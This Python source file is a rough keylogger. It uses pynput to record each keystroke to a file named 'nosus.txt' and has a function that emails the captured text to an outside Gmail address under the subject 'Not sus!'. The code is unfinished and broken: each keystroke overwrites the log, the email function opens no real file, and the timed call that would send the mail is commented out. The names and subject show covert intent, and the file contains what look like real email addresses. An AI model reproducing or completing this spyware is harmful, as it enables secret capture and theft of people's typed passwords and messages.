import smtplib
from pynput.keyboard import Key, Listener
# funtion shit
import time
strttime=time.time()


def press(da_key):
    global strttime
    strttime=time.time()
    with open('nosus.txt', 'w') as f:
        f.write(str(da_key))
    #print(str(da_key))

def release(da_key):
    if da_key==Key.esc:
        return False

def msg():
    # nosusboiiymIf3zXfFi5p2OXyL@gmail.com
    from email.message import EmailMessage
    # Open the plain text file whose name is in textfile for reading.
    textfile=None
    with open(textfile) as fp:
        msg = EmailMessage()
        msg.set_content(fp.read())
    msg['Subject'] = 'Not sus!'
    msg['From'] = 'samantshourya@gmail.com'
    msg['To'] = 'nosusboiiymIf3zXfFi5p2OXyL@gmail.com'
    s = smtplib.SMTP('localhost')
    s.send_message(msg)
    s.quit()

#shit is happening
print('ready')
with Listener(on_press=press, on_release=release) as listener:
    listener.join()

# while current_time-strttime<60:
#     current_time=time.time()
#     if (current_time-strttime>=60):
#         #msg()
#         pass

    